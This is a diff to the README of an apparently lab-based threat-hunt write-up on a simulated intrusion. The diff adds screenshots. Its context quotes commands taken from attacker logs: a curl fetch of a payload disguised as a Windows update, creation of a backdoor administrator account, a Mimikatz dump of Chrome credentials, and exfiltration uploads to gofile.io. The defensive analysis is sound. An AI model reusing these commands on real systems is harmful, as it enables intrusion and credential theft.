@@ -1,3 +1,5 @@
+<img width="503" height="753" alt="image" src="https://github.com/user-attachments/assets/3423287d-8b85-4ff4-a452-e8f43763a32b" />
+
 # Threat-Hunt-Bridge-Takeover
 
 Executive Summary
@@ -36,7 +38,11 @@ Analysis of DeviceNetworkEvents on azuki-adminpc filtered for curl.exe connectio
 "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
 The archive was disguised as a Windows cumulative security update (KB5044273) to avoid suspicion. Subsequent process execution logs showed the archive was extracted using 7-Zip with a password parameter:
 "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
-<img width="1699" height="394" alt="Screenshot 2026-04-13 182742" src="https://github.com/user-attachments/assets/29db93fd-ff27-446f-ac45-9728992d22e4" />
+<img width="1699" height="394" alt="Screenshot 2026-04-13 182742" src="https://github.com/user-attachments/assets/075b3622-ae5c-47ee-b809-23108cd26136" />
+<img width="1703" height="631" alt="Screenshot 2026-04-13 182817" src="https://github.com/user-attachments/assets/aa58066f-10ec-4815-af4d-58c9f62b029c" />
+<img width="1702" height="463" alt="Screenshot 2026-04-13 183649" src="https://github.com/user-attachments/assets/e491921d-3209-4435-89b8-60a104f40912" />
+
+
 
 C2 Implant & Named Pipe
 Querying DeviceFileEvents for executable and script file creations in the extraction timeframe on azuki-adminpc revealed three malicious files extracted from the archive at 2025-11-25T04:21:33Z: meterpreter.exe (the primary C2 beacon), silentlynx.exe, and m.exe (Mimikatz credential theft tool).
@@ -44,6 +50,10 @@ Analysis of DeviceEvents for NamedPipeEvent actions on azuki-adminpc, with JSON 
 \Device\NamedPipe\msf-pipe-5902  (created at 04:24:35)
 \Device\NamedPipe\msf-pipe-5722  (created at 05:36:54)
 The "msf-pipe" naming pattern is a well-known Metasploit Framework indicator of compromise and confirms active C2 communication channels.
+<img width="1325" height="648" alt="Screenshot 2026-04-13 185105" src="https://github.com/user-attachments/assets/70322bd0-56e3-485c-90cb-cab05c6c0836" />
+<img width="1718" height="611" alt="Screenshot 2026-04-14 175802" src="https://github.com/user-attachments/assets/ccb66d3f-4ad9-4a5c-a116-32cb0b86907e" />
+
+
 
 Obfuscated Commands – Account Creation & Privilege Escalation
 DeviceProcessEvents queries filtered for PowerShell executions with -EncodedCommand parameters on azuki-adminpc under the yuki.tanaka account revealed two Base64-encoded commands. Decoding these commands exposed:
@@ -52,6 +62,10 @@ net user yuki.tanaka2 B@ckd00r2024! /add
 Privilege escalation command:
 net localgroup Administrators yuki.tanaka2 /add
 The backdoor account yuki.tanaka2 was crafted to closely resemble the legitimate yuki.tanaka account, making it difficult to detect through casual inspection. The account was immediately elevated to the local Administrators group, granting full system privileges.
+<img width="1598" height="420" alt="Screenshot 2026-04-14 182131" src="https://github.com/user-attachments/assets/567a0301-d1ff-42e4-8284-644d828e59ac" />
+<img width="1527" height="606" alt="Screenshot 2026-04-14 182708" src="https://github.com/user-attachments/assets/4bf5c7bc-4430-4a2b-a211-0786ad681d94" />
+
+
 
 Discovery & Reconnaissance
 
@@ -63,7 +77,11 @@ The attacker executed a systematic series of discovery commands to map the envir
 | 04:10:07 | T1049 | `"NETSTAT.EXE" -ano` | Map active network connections and listening services |
 | 04:13:45 | T1552.001 | `cmd.exe /c where /r C:\Users *.kdbx` | Search for KeePass password database files |
 | 04:15:57 | T1552.001 | OLD-Passwords.lnk discovered | Plaintext password file found on user Desktop |
-
+<img width="1482" height="495" alt="Screenshot 2026-04-17 174532" src="https://github.com/user-attachments/assets/0ce9f992-f870-43e3-a2b2-01aac95c8a87" />
+<img width="1582" height="596" alt="Screenshot 2026-04-17 161622" src="https://github.com/user-attachments/assets/6cde73fe-eb35-427b-ad2a-03b1a92e57d3" />
+<img width="1561" height="421" alt="Screenshot 2026-04-17 162714" src="https://github.com/user-attachments/assets/45313237-9d5d-4ea1-85f7-9676c4abb361" />
+<img width="1690" height="495" alt="Screenshot 2026-04-17 163205" src="https://github.com/user-attachments/assets/aced4669-f958-46f6-bf7a-2d33bb31c76d" />
+<img width="1601" height="592" alt="Screenshot 2026-04-17 163507" src="https://github.com/user-attachments/assets/a8dd4285-44a6-448a-86b8-e7e837b958a0" />
 
 Data Staging & Collection
 
@@ -77,8 +95,9 @@ Robocopy.exe was used with retry and performance flags (/E /R:1 /W:1 /NP) to sys
 | 04:37:22 | C:\Users\yuki.tanaka\Documents\Tax-Records | staging\Tax-Records |
 | 04:37:38 | C:\Users\yuki.tanaka\Documents\Contracts | staging\Contracts |
 DeviceFileEvents filtered for archive file creations (.zip, .tar, .gz, .7z, .rar) confirmed a total of 8 distinct archives were created for exfiltration, including: credentials.tar.gz, tax-documents.tar.gz, banking-records.tar.gz (among others). The initial malware archive KB5044273-x64.7z was also present but was part of the delivery, not exfiltration.
-
-
+<img width="1611" height="611" alt="Screenshot 2026-04-17 175225" src="https://github.com/user-attachments/assets/388fd92b-a1a1-4b7f-9e71-ce770ffdbea9" />
+<img width="1692" height="610" alt="Screenshot 2026-04-17 165807" src="https://github.com/user-attachments/assets/1deff236-1520-49a3-90e9-74344f564757" />
+<img width="1474" height="600" alt="Screenshot 2026-04-17 170947" src="https://github.com/user-attachments/assets/071a8338-9f26-41b9-9ea3-b02e0dc75cd1" />
 
 Credential Theft
 A second download from litter.catbox.moe was observed at 2025-11-25T05:55:34Z, retrieving an additional credential theft tool:
@@ -86,7 +105,9 @@ A second download from litter.catbox.moe was observed at 2025-11-25T05:55:34Z, r
 After extraction, the Mimikatz tool (m.exe) was executed to harvest saved browser credentials from Google Chrome:
 "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
 Additionally, DeviceFileEvents on azuki-adminpc revealed the creation of KeePass-Master-Password.txt in the user Documents directory, indicating extraction of the master password for the KeePass password manager. This would grant the attacker access to all credentials stored within the KeePass vault.
-
+<img width="1660" height="619" alt="Screenshot 2026-04-17 171613" src="https://github.com/user-attachments/assets/55c543e5-4f67-4008-8975-b8e6b67ca901" />
+<img width="1710" height="615" alt="Screenshot 2026-04-17 171908" src="https://github.com/user-attachments/assets/db08f80a-2ff7-4747-a8d3-3abcdd35186e" />
+<img width="999" height="640" alt="Screenshot 2026-04-17 175433" src="https://github.com/user-attachments/assets/335cd698-5d12-4bd9-9378-ddcabbc29f48" />
 
 Exfiltration
  
@@ -100,6 +121,10 @@ Exfiltration
 | 04:49:19 | chrome-credentials.tar.gz | store1.gofile.io/uploadFile |
 | 05:56:50 | chrome-session-theft.tar.gz | store1.gofile.io/uploadFile |
 DeviceNetworkEvents confirmed the exfiltration destination server IP as 45.112.123.227, with connections originating from the local IP 10.1.0.108 on azuki-adminpc
+<img width="1464" height="628" alt="Screenshot 2026-04-17 172149" src="https://github.com/user-attachments/assets/3dfad6a7-d472-4fea-9f32-3fc330dd42c4" />
+<img width="1269" height="620" alt="Screenshot 2026-04-17 172717" src="https://github.com/user-attachments/assets/6830e050-6b91-4114-8422-4745c74ebb36" />
+
+
 
 Network IoCs
  
